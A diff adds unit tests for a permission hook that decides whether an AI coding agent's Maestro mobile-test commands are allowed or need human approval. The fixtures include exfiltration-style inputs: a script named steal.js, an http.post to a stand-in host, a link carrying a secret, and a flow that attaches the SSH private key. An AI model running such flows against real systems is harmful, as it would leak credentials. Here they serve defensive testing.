@@ -418,6 +418,145 @@ class ClaudeInstallGateTest(ClaudeHooksCase):
                 self.assertIsNone(self.gate(command))
 
 
+class ClaudeMaestroGateTest(ClaudeHooksCase):
+    def setUp(self):
+        tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(tmp.cleanup)
+        self.repo = Path(os.path.realpath(tmp.name))
+        self.groups = json.loads((ROOT / ".claude/settings.json").read_text())["hooks"]["PreToolUse"]
+
+    def write(self, relative, text):
+        path = self.repo / relative
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(text)
+
+    def gate(self, tool_input, tool_name="mcp__maestro__run"):
+        payload = {"tool_name": tool_name, "tool_input": tool_input, "cwd": str(self.repo)}
+        for group in self.groups:
+            if not re.fullmatch(group.get("matcher", ""), tool_name):
+                continue
+            for hook in group["hooks"]:
+                if "bash-log.txt" in hook["command"]:
+                    continue
+                stdout = self.run_hook(hook["command"], payload).stdout
+                if stdout.strip():
+                    return json.loads(stdout)["hookSpecificOutput"]["permissionDecision"]
+        return None
+
+    def shell(self, command):
+        return self.gate({"command": command}, tool_name="Bash")
+
+    def write_suite(self):
+        self.write("e2e/flows/a.yaml", "appId: x\n---\n- runFlow: ../sub/login.yaml\n- tapOn: A\n")
+        self.write("e2e/flows/b.yaml", "- assertVisible: ${output.title}\n")
+        self.write("e2e/sub/login.yaml", "- inputText: ${USERNAME}\n")
+
+    def test_shell_test_runs_of_device_only_flows_are_allowed(self):
+        self.write_suite()
+        for command in (
+            "maestro test e2e/flows",
+            "maestro test e2e/flows/a.yaml e2e/flows/b.yaml",
+            "maestro --device ABC test --format junit --output report.xml -e USERNAME=probe e2e/flows",
+            "maestro test --include-tags=smoke --debug-output e2e/debug e2e/flows",
+            "maestro --version",
+        ):
+            with self.subTest(command=command):
+                self.assertEqual(self.shell(command), "allow")
+
+    def test_shell_test_runs_that_reach_past_the_device_ask(self):
+        self.write_suite()
+        self.write("e2e/risky.yaml", "- runScript: probe.js\n")
+        for command in (
+            "maestro test e2e/risky.yaml",
+            "maestro test e2e/missing.yaml",
+            "maestro test -c e2e/flows",
+            "maestro test --continuous e2e/flows",
+            "maestro test --output ../outside.xml e2e/flows",
+            "maestro test --test-output-dir=/var/tmp e2e/flows",
+            "maestro test -e TOKEN=${SECRET} e2e/flows",
+            "maestro test e2e/flows | tee log.txt",
+            "maestro test",
+        ):
+            with self.subTest(command=command):
+                self.assertEqual(self.shell(command), "ask")
+
+    def test_other_maestro_subcommands_ask(self):
+        for command in (
+            "maestro cloud --app-file app.apk e2e/flows",
+            "maestro login",
+            "maestro record e2e/flows/a.yaml",
+            "maestro studio",
+            "maestro --device ABC cloud e2e/flows",
+        ):
+            with self.subTest(command=command):
+                self.assertEqual(self.shell(command), "ask")
+
+    def test_shell_commands_that_are_not_maestro_are_unaffected(self):
+        for command in (
+            "git status",
+            "echo maestro test",
+            "pnpm --filter @x/e2e test:maestro",
+            "cat e2e/maestro/config.yaml",
+        ):
+            with self.subTest(command=command):
+                self.assertIsNone(self.shell(command))
+
+    def test_env_values_with_javascript_ask(self):
+        self.assertEqual(
+            self.gate({"device_id": "d", "yaml": "- tapOn: A", "env": {"X": "${http.get(1)}"}}),
+            "ask",
+        )
+
+    def test_device_only_inline_flows_are_allowed(self):
+        for flow in (
+            "- launchApp\n- tapOn: Login\n- inputText: ${USERNAME}",
+            "appId: com.example\n---\n- assertVisible: ${output.title}\n- takeScreenshot: home",
+            "- runFlow:\n    when:\n      visible: Accept\n    commands:\n      - tapOn: Accept",
+        ):
+            with self.subTest(flow=flow):
+                self.assertEqual(self.gate({"device_id": "d", "yaml": flow}), "allow")
+
+    def test_code_and_network_commands_ask(self):
+        for flow in (
+            "- runScript: steal.js",
+            "- evalScript: ${http.post(\"https://example.invalid\", {body: \"x\"})}",
+            "- openLink: https://example.invalid/?q=secret",
+            "- addMedia:\n    - ../../.ssh/id_ed25519",
+            "- inputText: ${http.get(\"https://example.invalid\").body}",
+            "- runFlow:\n    when:\n      true: ${maestro.platform == \"ios\"}\n    commands:\n      - tapOn: A",
+        ):
+            with self.subTest(flow=flow):
+                self.assertEqual(self.gate({"device_id": "d", "yaml": flow}), "ask")
+
+    def test_files_and_the_flows_they_run_are_inspected(self):
+        self.write("e2e/main.yaml", "appId: x\n---\n- runFlow: sub/login.yaml\n- runFlow:\n    file: sub/home.yaml\n")
+        self.write("e2e/sub/login.yaml", "- tapOn: Login\n")
+        self.write("e2e/sub/home.yaml", "- assertVisible: Home\n")
+        self.assertEqual(self.gate({"device_id": "d", "files": ["e2e/main.yaml"]}), "allow")
+        self.write("e2e/sub/home.yaml", "- runScript: probe.js\n")
+        self.assertEqual(self.gate({"device_id": "d", "files": ["e2e/main.yaml"]}), "ask")
+
+    def test_flow_file_referenced_inline_is_inspected(self):
+        self.write("sub/bad.yaml", "- openLink: https://example.invalid\n")
+        self.assertEqual(self.gate({"device_id": "d", "yaml": "- runFlow: sub/bad.yaml"}), "ask")
+
+    def test_unreadable_flow_asks(self):
+        self.assertEqual(self.gate({"device_id": "d", "files": ["missing.yaml"]}), "ask")
+
+    def test_directory_mode_inspects_every_flow(self):
+        self.write("flows/config.yaml", "flows:\n  - '*'\n")
+        self.write("flows/a.yaml", "- tapOn: A\n")
+        self.write("flows/nested/b.yml", "- tapOn: B\n")
+        self.assertEqual(self.gate({"device_id": "d", "dir": "flows"}), "allow")
+        self.write("flows/nested/c.yaml", "- evalScript: ${1}\n")
+        self.assertEqual(self.gate({"device_id": "d", "dir": "flows"}), "ask")
+
+    def test_other_maestro_tools_are_left_to_their_own_rules(self):
+        for name in ("mcp__maestro__run_on_cloud", "mcp__maestro__inspect_screen"):
+            with self.subTest(name=name):
+                self.assertIsNone(self.gate({"device_id": "d", "yaml": "- tapOn: A"}, tool_name=name))
+
+
 @unittest.skipUnless(shutil.which("git"), "git is required for the WorktreeCreate hook")
 class ClaudeWorktreeCreateHookTest(ClaudeHooksCase):
     def setUp(self):
